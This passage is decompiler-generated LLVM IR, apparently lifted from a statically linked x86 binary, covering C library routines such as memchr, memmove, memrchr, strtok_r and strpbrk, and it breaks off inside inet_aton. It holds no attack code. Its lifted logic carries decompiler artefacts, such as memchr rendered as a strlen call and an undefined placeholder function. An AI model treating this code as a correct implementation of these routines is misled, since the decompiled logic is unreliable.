  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 7, 8, 9, 10, 13, 12, 14, 11, 15, 4, 5, 6 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 9, 10, 11, 14, 15, 12, 13, 16, 20, 19, 21, 17, 18, 22, 25, 23, 26, 24, 27, 29, 28, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 3, 5, 4, 6, 7, 8, 9, 0, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 9, 10, 8, 11, 12, 13, 14, 23, 15, 16, 24, 18, 19, 17, 21, 20, 22, 3, 4, 5, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 6, 7, 8, 9, 10, 11, 3, 2, 0, 4, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 11, 12, 29, 30, 31, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055a0e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055a0c, { 1, 0 }
  uselistorder label %dec_label_pc_805598b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805593d, { 1, 0 }
  uselistorder label %dec_label_pc_8055915, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80558e4, { 1, 0 }
  uselistorder label %dec_label_pc_80558d1, { 1, 0 }
  uselistorder label %dec_label_pc_80558b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805586f, { 1, 0 }
  uselistorder label %dec_label_pc_8055864, { 1, 0 }
  uselistorder label %dec_label_pc_80557eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80557dd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80557a3, { 1, 0 }
  uselistorder label %dec_label_pc_8055773.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805573f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805570e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80556f9, { 1, 0 }
  uselistorder label %dec_label_pc_80555b0, { 1, 0 }
  uselistorder label %dec_label_pc_80554d4, { 1, 0 }
  uselistorder label %dec_label_pc_80554cb, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a48 = load i32, i32* @edi, align 4
  store i32 %v0_8055a48, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055a4f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055a4f, i32* %edi.global-to-local, align 4
  %v1_8055a57 = icmp eq i32 %arg3, 0
  store i1 %v1_8055a57, i1* %zf.global-to-local, align 1
  br i1 %v1_8055a57, label %dec_label_pc_8055a67, label %dec_label_pc_8055a5b

dec_label_pc_8055a5b:                             ; preds = %entry
  %v2_8055a5b = call i32 @_strlen(i8* %arg1)
  %v3_8055a5b = mul i32 %v2_8055a5b, -1
  %v4_8055a5b = add i32 %v3_8055a5b, -2
  store i32 %v4_8055a5b, i32* @ecx, align 4
  %v0_8055a5d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055a5d, label %dec_label_pc_8055a5b.dec_label_pc_8055a64_crit_edge, label %dec_label_pc_8055a5f

dec_label_pc_8055a5b.dec_label_pc_8055a64_crit_edge: ; preds = %dec_label_pc_8055a5b
  %v0_8055a64.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055a64.pre, -1
  br label %dec_label_pc_8055a64

dec_label_pc_8055a5f:                             ; preds = %dec_label_pc_8055a5b
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055a64

dec_label_pc_8055a64:                             ; preds = %dec_label_pc_8055a5b.dec_label_pc_8055a64_crit_edge, %dec_label_pc_8055a5f
  %v0_8055a64 = phi i32 [ %phitmp, %dec_label_pc_8055a5b.dec_label_pc_8055a64_crit_edge ], [ 0, %dec_label_pc_8055a5f ]
  %v8_8055a64 = icmp eq i32 %v0_8055a64, 0
  store i1 %v8_8055a64, i1* %zf.global-to-local, align 1
  store i32 %v0_8055a64, i32* %edi.global-to-local, align 4
  %v2_8055a69.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055a67

dec_label_pc_8055a67:                             ; preds = %entry, %dec_label_pc_8055a64
  %v2_8055a69 = phi i32 [ %v0_8055a48, %entry ], [ %v2_8055a69.pre, %dec_label_pc_8055a64 ]
  %v0_8055a67 = phi i32 [ 0, %entry ], [ %v0_8055a64, %dec_label_pc_8055a64 ]
  store i32 %v2_8055a69, i32* @edi, align 4
  ret i32 %v0_8055a67

; uselistorder directives
  uselistorder i32 %v0_8055a64, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055a67, { 1, 0 }
  uselistorder label %dec_label_pc_8055a64, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055a6d = load i32, i32* @esi, align 4
  store i32 %v0_8055a6d, i32* %stack_var_-8, align 4
  %v4_8055a6e = ptrtoint i8* %arg1 to i32
  %v9_8055a7a = icmp ugt i8* %tmp3, %arg1
  %v1_8055a7c = icmp eq i1 %v9_8055a7a, false
  br i1 %v1_8055a7c, label %dec_label_pc_8055a84, label %dec_label_pc_8055a7e

dec_label_pc_8055a7e:                             ; preds = %entry
  %v7_8055a80 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8055a90

dec_label_pc_8055a84:                             ; preds = %entry
  %v3_8055a84 = add i32 %arg2, -1
  %v4_8055a84 = add i32 %v3_8055a84, %tmp
  %v5_8055a84 = inttoptr i32 %v4_8055a84 to i8*
  %v3_8055a88 = add i32 %v4_8055a6e, -1
  %v4_8055a88 = add i32 %v3_8055a88, %tmp
  %v5_8055a88 = inttoptr i32 %v4_8055a88 to i8*
  %v7_8055a8d = call i8* @_memcpy(i8* %v5_8055a88, i8* %v5_8055a84, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055a90

dec_label_pc_8055a90:                             ; preds = %dec_label_pc_8055a7e, %dec_label_pc_8055a84
  %v2_8055a90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055a90, i32* @esi, align 4
  ret i32 %v4_8055a6e

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055a90, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055a94 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8055aa7 = inttoptr i32 %arg1 to i16*
  %v4_8055aa7 = call i32 @memcpy(i16* %v3_8055aa7, i32 %arg2, i32 %arg3)
  %v0_8055aac = load i32, i32* @esi, align 4
  %v2_8055aac = add i32 %v0_8055aac, %arg3
  store i32 %v0_8055a94, i32* @esi, align 4
  ret i32 %v2_8055aac
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055abd = urem i32 %arg2, 256
  %v4_8055ac9 = sext i8 %arg1 to i32
  %v2_8055acd = add i32 %v4_8055ac9, %arg3
  %v1_8055adf6 = icmp eq i32 %arg3, 0
  br i1 %v1_8055adf6, label %dec_label_pc_8055ae7, label %dec_label_pc_8055ae3

dec_label_pc_8055ad1:                             ; preds = %dec_label_pc_8055ae3
  %v1_8055ad1 = add i32 %v0_8055ad1, -1
  %v5_8055ad2 = load i32, i32* @edx, align 4
  %v6_8055ad2 = and i32 %v5_8055ad2, -256
  %v7_8055ad2 = or i32 %v6_8055ad2, %v4_8055abd
  store i32 %v7_8055ad2, i32* @edx, align 4
  %v1_8055ad6 = inttoptr i32 %v1_8055ad1 to i8*
  %v2_8055ad6 = load i8, i8* %v1_8055ad6, align 1
  %v15_8055ad6 = icmp eq i8 %v2_8055ad6, %tmp
  br i1 %v15_8055ad6, label %dec_label_pc_8055b64, label %dec_label_pc_8055ade

dec_label_pc_8055ade:                             ; preds = %dec_label_pc_8055ad1
  %v1_8055ade = add i32 %v0_8055ade, -1
  %v8_8055ade = icmp eq i32 %v1_8055ade, 0
  br i1 %v8_8055ade, label %dec_label_pc_8055ae7, label %dec_label_pc_8055ae3

dec_label_pc_8055ae3:                             ; preds = %entry, %dec_label_pc_8055ade
  %v0_8055ade = phi i32 [ %v1_8055ade, %dec_label_pc_8055ade ], [ %arg3, %entry ]
  %v0_8055ad1 = phi i32 [ %v1_8055ad1, %dec_label_pc_8055ade ], [ %v2_8055acd, %entry ]
  %v2_8055ae3 = urem i32 %v0_8055ad1, 4
  %v3_8055ae3 = icmp eq i32 %v2_8055ae3, 0
  %v1_8055ae5 = icmp eq i1 %v3_8055ae3, false
  br i1 %v1_8055ae5, label %dec_label_pc_8055ad1, label %dec_label_pc_8055ae7

dec_label_pc_8055ae7:                             ; preds = %dec_label_pc_8055ade, %dec_label_pc_8055ae3, %entry
  %v0_8055b4a.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055ade ], [ %v0_8055ade, %dec_label_pc_8055ae3 ]
  %v0_8055aec = phi i32 [ %v2_8055acd, %entry ], [ %v1_8055ad1, %dec_label_pc_8055ade ], [ %v0_8055ad1, %dec_label_pc_8055ae3 ]
  store i32 %v0_8055aec, i32* @ecx, align 4
  %v2_8055af0 = mul nuw nsw i32 %v4_8055abd, 256
  %v2_8055af3 = or i32 %v2_8055af0, %v4_8055abd
  %v2_8055af7 = mul i32 %v2_8055af3, 65536
  %v2_8055afa = or i32 %v2_8055af7, %v2_8055af3
  %v6_8055b4d49 = icmp ugt i32 %v0_8055b4a.pr, 3
  br i1 %v6_8055b4d49, label %dec_label_pc_8055afe, label %dec_label_pc_8055b4f

dec_label_pc_8055afe:                             ; preds = %dec_label_pc_8055ae7, %dec_label_pc_8055b47
  %v0_8055b4751 = phi i32 [ %v1_8055b47, %dec_label_pc_8055b47 ], [ %v0_8055b4a.pr, %dec_label_pc_8055ae7 ]
  %v0_8055afe50 = phi i32 [ %v1_8055afe, %dec_label_pc_8055b47 ], [ %v0_8055aec, %dec_label_pc_8055ae7 ]
  %v1_8055afe = add i32 %v0_8055afe50, -4
  store i32 %v1_8055afe, i32* @ecx, align 4
  %v2_8055b03 = inttoptr i32 %v1_8055afe to i32*
  %v3_8055b03 = load i32, i32* %v2_8055b03, align 4
  %v4_8055b03 = xor i32 %v3_8055b03, %v2_8055afa
  %v1_8055b05 = add i32 %v4_8055b03, 2130640639
  %v1_8055b0b = sub i32 -1, %v4_8055b03
  %v2_8055b0d = xor i32 %v1_8055b05, %v1_8055b0b
  %v1_8055b0f = and i32 %v2_8055b0d, -2130640640
  %v2_8055b0f = icmp eq i32 %v1_8055b0f, 0
  br i1 %v2_8055b0f, label %dec_label_pc_8055b47, label %dec_label_pc_8055b17

dec_label_pc_8055b17:                             ; preds = %dec_label_pc_8055afe
  %v7_8055b17 = or i32 %v1_8055b0f, %v4_8055abd
  %v1_8055b1b = add i32 %v0_8055afe50, -1
  %v2_8055b1e = inttoptr i32 %v1_8055b1b to i8*
  %v3_8055b1e = load i8, i8* %v2_8055b1e, align 1
  %v16_8055b1e = icmp eq i8 %v3_8055b1e, %tmp
  br i1 %v16_8055b1e, label %dec_label_pc_8055b64, label %dec_label_pc_8055b23

dec_label_pc_8055b23:                             ; preds = %dec_label_pc_8055b17
  %v1_8055b27 = add i32 %v0_8055afe50, -2
  %v2_8055b2a = inttoptr i32 %v1_8055b27 to i8*
  %v3_8055b2a = load i8, i8* %v2_8055b2a, align 1
  %v16_8055b2a = icmp eq i8 %v3_8055b2a, %tmp
  br i1 %v16_8055b2a, label %dec_label_pc_8055b64, label %dec_label_pc_8055b2f

dec_label_pc_8055b2f:                             ; preds = %dec_label_pc_8055b23
  %v1_8055b33 = add i32 %v0_8055afe50, -3
  %v2_8055b36 = inttoptr i32 %v1_8055b33 to i8*
  %v3_8055b36 = load i8, i8* %v2_8055b36, align 1
  %v16_8055b36 = icmp eq i8 %v3_8055b36, %tmp
  br i1 %v16_8055b36, label %dec_label_pc_8055b64, label %dec_label_pc_8055b3b

dec_label_pc_8055b3b:                             ; preds = %dec_label_pc_8055b2f
  %v1_8055b3f = inttoptr i32 %v1_8055afe to i8*
  %v2_8055b3f = load i8, i8* %v1_8055b3f, align 1
  %v15_8055b3f = icmp eq i8 %v2_8055b3f, %tmp
  %v1_8055b41 = icmp eq i1 %v15_8055b3f, false
  br i1 %v1_8055b41, label %dec_label_pc_8055b47, label %dec_label_pc_8055b43

dec_label_pc_8055b43:                             ; preds = %dec_label_pc_8055b3b
  br label %dec_label_pc_8055b64

dec_label_pc_8055b47:                             ; preds = %dec_label_pc_8055b3b, %dec_label_pc_8055afe
  %v5_8055b5426 = phi i32 [ %v7_8055b17, %dec_label_pc_8055b3b ], [ 0, %dec_label_pc_8055afe ]
  %v1_8055b47 = add i32 %v0_8055b4751, -4
  %v6_8055b4d = icmp ugt i32 %v1_8055b47, 3
  br i1 %v6_8055b4d, label %dec_label_pc_8055afe, label %dec_label_pc_8055b4f

dec_label_pc_8055b4f:                             ; preds = %dec_label_pc_8055b47, %dec_label_pc_8055ae7
  %v5_8055b5425.lcssa = phi i32 [ %v4_8055abd, %dec_label_pc_8055ae7 ], [ %v5_8055b5426, %dec_label_pc_8055b47 ]
  %v0_8055afe.lcssa = phi i32 [ %v0_8055aec, %dec_label_pc_8055ae7 ], [ %v1_8055afe, %dec_label_pc_8055b47 ]
  %v0_8055b47.lcssa = phi i32 [ %v0_8055b4a.pr, %dec_label_pc_8055ae7 ], [ %v1_8055b47, %dec_label_pc_8055b47 ]
  br label %dec_label_pc_8055b5c

dec_label_pc_8055b53:                             ; preds = %dec_label_pc_8055b5c
  %v1_8055b5c = add i32 %v0_8055b5c, -1
  %v1_8055b53 = add i32 %v0_8055b53, -1
  %v6_8055b54 = and i32 %v5_8055b54, -256
  %v7_8055b54 = or i32 %v6_8055b54, %v4_8055abd
  %v1_8055b58 = inttoptr i32 %v1_8055b53 to i8*
  %v2_8055b58 = load i8, i8* %v1_8055b58, align 1
  %v15_8055b58 = icmp eq i8 %v2_8055b58, %tmp
  br i1 %v15_8055b58, label %dec_label_pc_8055b64, label %dec_label_pc_8055b5c

dec_label_pc_8055b5c:                             ; preds = %dec_label_pc_8055b53, %dec_label_pc_8055b4f
  %v5_8055b54 = phi i32 [ %v7_8055b54, %dec_label_pc_8055b53 ], [ %v5_8055b5425.lcssa, %dec_label_pc_8055b4f ]
  %v0_8055b53 = phi i32 [ %v1_8055b53, %dec_label_pc_8055b53 ], [ %v0_8055afe.lcssa, %dec_label_pc_8055b4f ]
  %v0_8055b5c = phi i32 [ %v1_8055b5c, %dec_label_pc_8055b53 ], [ %v0_8055b47.lcssa, %dec_label_pc_8055b4f ]
  %v10_8055b5d = icmp eq i32 %v0_8055b5c, 0
  %v1_8055b60 = icmp eq i1 %v10_8055b5d, false
  br i1 %v1_8055b60, label %dec_label_pc_8055b53, label %dec_label_pc_8055b62

dec_label_pc_8055b62:                             ; preds = %dec_label_pc_8055b5c
  br label %dec_label_pc_8055b64

dec_label_pc_8055b64:                             ; preds = %dec_label_pc_8055ad1, %dec_label_pc_8055b2f, %dec_label_pc_8055b23, %dec_label_pc_8055b17, %dec_label_pc_8055b53, %dec_label_pc_8055b43, %dec_label_pc_8055b62
  %v0_8055b67 = phi i32 [ %v1_8055afe, %dec_label_pc_8055b43 ], [ 0, %dec_label_pc_8055b62 ], [ %v1_8055b53, %dec_label_pc_8055b53 ], [ %v1_8055b33, %dec_label_pc_8055b2f ], [ %v1_8055b27, %dec_label_pc_8055b23 ], [ %v1_8055b1b, %dec_label_pc_8055b17 ], [ %v1_8055ad1, %dec_label_pc_8055ad1 ]
  ret i32 %v0_8055b67

; uselistorder directives
  uselistorder i32 %v0_8055b5c, { 1, 0 }
  uselistorder i32 %v1_8055b47, { 0, 2, 1 }
  uselistorder i32 %v1_8055afe, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8055afe50, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8055af3, { 1, 0 }
  uselistorder i32 %v0_8055ad1, { 1, 0, 2 }
  uselistorder i32 %v2_8055acd, { 1, 0 }
  uselistorder i32 %v4_8055abd, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055b64, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055afe, { 1, 0 }
  uselistorder label %dec_label_pc_8055ae7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055ae3, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055b68 = load i32, i32* @edi, align 4
  %v0_8055b69 = load i32, i32* @esi, align 4
  %v0_8055b6a = load i32, i32* @ebx, align 4
  store i32 %v0_8055b6a, i32* %stack_var_-12, align 4
  %v4_8055b6b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b6b, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055b77 = icmp eq i8* %arg1, null
  %v1_8055b79 = icmp eq i1 %v1_8055b77, false
  br i1 %v1_8055b79, label %dec_label_pc_8055b7d, label %dec_label_pc_8055b7b

dec_label_pc_8055b7b:                             ; preds = %entry
  %v1_8055b7b = inttoptr i32 %arg3 to i32*
  %v2_8055b7b = load i32, i32* %v1_8055b7b, align 4
  store i32 %v2_8055b7b, i32* @ebx, align 4
  br label %dec_label_pc_8055b7d

dec_label_pc_8055b7d:                             ; preds = %entry, %dec_label_pc_8055b7b
  %v0_8055b80 = phi i32 [ %v4_8055b6b, %entry ], [ %v2_8055b7b, %dec_label_pc_8055b7b ]
  %v0_8055b7d = load i32, i32* @ecx, align 4
  %v5_8055b80 = inttoptr i32 %v0_8055b80 to i8*
  %v8_8055b81 = call i32 @__GI_strspn(i8* %v5_8055b80, i32 %arg2, i32 %v0_8055b7d, i32 %v0_8055b7d)
  store i32 %v8_8055b81, i32* %eax.global-to-local, align 4
  %v0_8055b89 = load i32, i32* @ebx, align 4
  %v2_8055b89 = add i32 %v0_8055b89, %v8_8055b81
  store i32 %v2_8055b89, i32* @ebx, align 4
  %v1_8055b8b = inttoptr i32 %v2_8055b89 to i8*
  %v2_8055b8b = load i8, i8* %v1_8055b8b, align 1
  %v3_8055b8b = icmp eq i8 %v2_8055b8b, 0
  %v1_8055b8e = icmp eq i1 %v3_8055b8b, false
  br i1 %v1_8055b8e, label %dec_label_pc_8055b96, label %dec_label_pc_8055b90

dec_label_pc_8055b90:                             ; preds = %dec_label_pc_8055b7d
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055b92 = load i32, i32* @esi, align 4
  %v2_8055b92 = inttoptr i32 %v1_8055b92 to i32*
  store i32 %v2_8055b89, i32* %v2_8055b92, align 4
  %v0_8055bc0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055bbd

dec_label_pc_8055b96:                             ; preds = %dec_label_pc_8055b7d
  %v0_8055b96 = load i32, i32* @edx, align 4
  %v0_8055b98 = load i32, i32* @edi, align 4
  %v8_8055b9a = call i32 @__GI_strpbrk(i8* %v1_8055b8b, i32 %v0_8055b98, i32 %v0_8055b96, i32 %v0_8055b96)
  store i32 %v8_8055b9a, i32* %eax.global-to-local, align 4
  %v2_8055ba2 = icmp eq i32 %v8_8055b9a, 0
  %v1_8055ba4 = icmp eq i1 %v2_8055ba2, false
  br i1 %v1_8055ba4, label %dec_label_pc_8055bb5, label %dec_label_pc_8055ba6

dec_label_pc_8055ba6:                             ; preds = %dec_label_pc_8055b96
  %v0_8055baa = load i32, i32* @ebx, align 4
  %v5_8055baa = inttoptr i32 %v0_8055baa to i8*
  %v8_8055bab = call i32 @rawmemchr(i8* %v5_8055baa, i32 0, i32 %v8_8055b9a, i32 %v8_8055b9a)
  br label %dec_label_pc_8055bb9

dec_label_pc_8055bb5:                             ; preds = %dec_label_pc_8055b96
  %v9_8055b9a = inttoptr i32 %v8_8055b9a to i8*
  store i8 0, i8* %v9_8055b9a, align 1
  %v2_8055bb8 = add i32 %v8_8055b9a, 1
  br label %dec_label_pc_8055bb9

dec_label_pc_8055bb9:                             ; preds = %dec_label_pc_8055ba6, %dec_label_pc_8055bb5
  %storemerge = phi i32 [ %v2_8055bb8, %dec_label_pc_8055bb5 ], [ %v8_8055bab, %dec_label_pc_8055ba6 ]
  %v0_8055bb9 = phi i32 [ %v2_8055bb8, %dec_label_pc_8055bb5 ], [ %v8_8055bab, %dec_label_pc_8055ba6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055bb9 = load i32, i32* @esi, align 4
  %v2_8055bb9 = inttoptr i32 %v1_8055bb9 to i32*
  store i32 %v0_8055bb9, i32* %v2_8055bb9, align 4
  %v0_8055bbb = load i32, i32* @ebx, align 4
  store i32 %v0_8055bbb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055bbd

dec_label_pc_8055bbd:                             ; preds = %dec_label_pc_8055b90, %dec_label_pc_8055bb9
  %v0_8055bc0 = phi i32 [ %v0_8055bc0.pre, %dec_label_pc_8055b90 ], [ %v0_8055bbb, %dec_label_pc_8055bb9 ]
  %v2_8055bbd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055bbd, i32* @ebx, align 4
  store i32 %v0_8055b69, i32* @esi, align 4
  store i32 %v0_8055b68, i32* @edi, align 4
  ret i32 %v0_8055bc0

; uselistorder directives
  uselistorder i32 %v8_8055b9a, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055bbd, { 1, 0 }
  uselistorder label %dec_label_pc_8055bb9, { 1, 0 }
  uselistorder label %dec_label_pc_8055b7d, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055bc5 = load i32, i32* @ebx, align 4
  %v2_8055bdc24 = load i8, i8* %arg1, align 1
  %v4_8055bde28 = icmp eq i8 %v2_8055bdc24, 0
  br i1 %v4_8055bde28, label %dec_label_pc_8055be6, label %dec_label_pc_8055be2.lr.ph

dec_label_pc_8055be2.lr.ph:                       ; preds = %entry
  %v3_8055bdc25 = zext i8 %v2_8055bdc24 to i32
  %v5_8055bdc26 = and i32 %v0_8055bc5, -256
  %v6_8055bdc27 = or i32 %v3_8055bdc25, %v5_8055bdc26
  %v4_8055bca = ptrtoint i8* %arg1 to i32
  %v1_8055bd513 = inttoptr i32 %arg2 to i8*
  %v4_8055bd5.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055be2

dec_label_pc_8055bd0:                             ; preds = %dec_label_pc_8055be2, %dec_label_pc_8055bd4
  %v6_8055bd522 = phi i32 [ %v6_8055bd5, %dec_label_pc_8055bd4 ], [ %v6_8055bd517, %dec_label_pc_8055be2 ]
  %v2_8055bd521 = phi i8 [ %v2_8055bd5, %dec_label_pc_8055bd4 ], [ %v2_8055bd514, %dec_label_pc_8055be2 ]
  %v0_8055bd420 = phi i32 [ %v1_8055bd4, %dec_label_pc_8055bd4 ], [ %arg2, %dec_label_pc_8055be2 ]
  %v15_8055bd0 = icmp eq i8 %v2_8055bd521, %v2_8055bdc31
  br i1 %v15_8055bd0, label %dec_label_pc_8055be8, label %dec_label_pc_8055bd4

dec_label_pc_8055bd4:                             ; preds = %dec_label_pc_8055bd0
  %v1_8055bd4 = add i32 %v0_8055bd420, 1
  store i32 %v1_8055bd4, i32* @edx, align 4
  %v1_8055bd5 = inttoptr i32 %v1_8055bd4 to i8*
  %v2_8055bd5 = load i8, i8* %v1_8055bd5, align 1
  %v3_8055bd5 = zext i8 %v2_8055bd5 to i32
  %v5_8055bd5 = and i32 %v6_8055bd522, -256
  %v6_8055bd5 = or i32 %v3_8055bd5, %v5_8055bd5
  store i32 %v6_8055bd5, i32* @ecx, align 4
  %v4_8055bd7 = icmp eq i8 %v2_8055bd5, 0
  %v1_8055bd9 = icmp eq i1 %v4_8055bd7, false
  br i1 %v1_8055bd9, label %dec_label_pc_8055bd0, label %dec_label_pc_8055bdb

dec_label_pc_8055bdb:                             ; preds = %dec_label_pc_8055bd4, %dec_label_pc_8055be2
  %v4_8055bd5.pre34 = phi i32 [ %v6_8055bd517, %dec_label_pc_8055be2 ], [ %v6_8055bd5, %dec_label_pc_8055bd4 ]
  %v1_8055bdb = add i32 %v0_8055bdb29, 1
  %v1_8055bdc = inttoptr i32 %v1_8055bdb to i8*
  %v2_8055bdc = load i8, i8* %v1_8055bdc, align 1
  %v3_8055bdc = zext i8 %v2_8055bdc to i32
  %v5_8055bdc = and i32 %v6_8055bdc32, -256
  %v6_8055bdc = or i32 %v3_8055bdc, %v5_8055bdc
  %v4_8055bde = icmp eq i8 %v2_8055bdc, 0
  br i1 %v4_8055bde, label %dec_label_pc_8055be6, label %dec_label_pc_8055be2

dec_label_pc_8055be2:                             ; preds = %dec_label_pc_8055be2.lr.ph, %dec_label_pc_8055bdb
  %v4_8055bd5.pre = phi i32 [ %v4_8055bd5.pre.pre, %dec_label_pc_8055be2.lr.ph ], [ %v4_8055bd5.pre34, %dec_label_pc_8055bdb ]
  %v6_8055bdc32 = phi i32 [ %v6_8055bdc27, %dec_label_pc_8055be2.lr.ph ], [ %v6_8055bdc, %dec_label_pc_8055bdb ]
  %v2_8055bdc31 = phi i8 [ %v2_8055bdc24, %dec_label_pc_8055be2.lr.ph ], [ %v2_8055bdc, %dec_label_pc_8055bdb ]
  %v0_8055bdb29 = phi i32 [ %v4_8055bca, %dec_label_pc_8055be2.lr.ph ], [ %v1_8055bdb, %dec_label_pc_8055bdb ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055bd514 = load i8, i8* %v1_8055bd513, align 1
  %v3_8055bd515 = zext i8 %v2_8055bd514 to i32
  %v5_8055bd516 = and i32 %v4_8055bd5.pre, -256
  %v6_8055bd517 = or i32 %v3_8055bd515, %v5_8055bd516
  store i32 %v6_8055bd517, i32* @ecx, align 4
  %v4_8055bd718 = icmp eq i8 %v2_8055bd514, 0
  %v1_8055bd919 = icmp eq i1 %v4_8055bd718, false
  br i1 %v1_8055bd919, label %dec_label_pc_8055bd0, label %dec_label_pc_8055bdb

dec_label_pc_8055be6:                             ; preds = %dec_label_pc_8055bdb, %entry
  br label %dec_label_pc_8055be8

dec_label_pc_8055be8:                             ; preds = %dec_label_pc_8055bd0, %dec_label_pc_8055be6
  %v0_8055bea = phi i32 [ 0, %dec_label_pc_8055be6 ], [ %v0_8055bdb29, %dec_label_pc_8055bd0 ]
  store i32 %v0_8055bc5, i32* @ebx, align 4
  ret i32 %v0_8055bea

; uselistorder directives
  uselistorder i32 %v6_8055bd517, { 2, 0, 1 }
  uselistorder i8 %v2_8055bd514, { 1, 2, 0 }
  uselistorder i32 %v1_8055bdb, { 1, 0 }
  uselistorder i32 %v6_8055bd5, { 1, 2, 0 }
  uselistorder i8 %v2_8055bd5, { 1, 2, 0 }
  uselistorder i32 %v1_8055bd4, { 2, 1, 0 }
  uselistorder i8 %v2_8055bdc24, { 0, 2, 1 }
  uselistorder i32 %v0_8055bc5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055be8, { 1, 0 }
  uselistorder label %dec_label_pc_8055be2, { 1, 0 }
  uselistorder label %dec_label_pc_8055bdb, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8055bf3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055bf3, i32* @ecx, align 4
  %v1_8055bf7 = icmp eq i8* %arg1, null
  br i1 %v1_8055bf7, label %dec_label_pc_8055c78, label %dec_label_pc_8055bfb

dec_label_pc_8055bfb:                             ; preds = %entry
  %v0_8055c09.pre = load i32, i32* @global_var_805f61c, align 4
  br label %dec_label_pc_8055c06

dec_label_pc_8055c06:                             ; preds = %dec_label_pc_8055bfb, %dec_label_pc_8055c4f
  %v2_8055c5235 = phi i32 [ 1, %dec_label_pc_8055bfb ], [ %v3_8055c52, %dec_label_pc_8055c4f ]
  %v0_8055c0634 = phi i32 [ %v4_8055bf3, %dec_label_pc_8055bfb ], [ %v0_8055c063, %dec_label_pc_8055c4f ]
